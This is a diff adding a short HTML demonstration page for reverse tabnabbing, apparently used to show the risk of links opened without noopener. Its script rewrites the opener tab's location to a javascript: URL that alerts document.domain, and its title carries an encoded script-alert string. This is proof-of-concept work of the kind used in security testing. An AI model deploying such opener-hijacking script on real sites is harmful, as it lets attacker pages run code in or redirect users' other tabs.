@@ -1,0 +1,12 @@
+
+<!DOCTYPE html>
+<meta charset="utf-8">
+<title>&#x3C;script&#x3E;alert(document.domain)&#x3C;/script&#x3E;</title>
+<h1>Why don’t you go back to the previous tab?</h1>
+<script>
+	if (window.opener) {
+		opener.location = 'javascript:alert(document.domain)';
+	} else {
+		document.querySelector('h1').innerHTML = 'The previous tab is safe and intact. <code>window.opener</code> was <code>null</code>; mischief <em>not</em> managed!';
+	}
+</script>
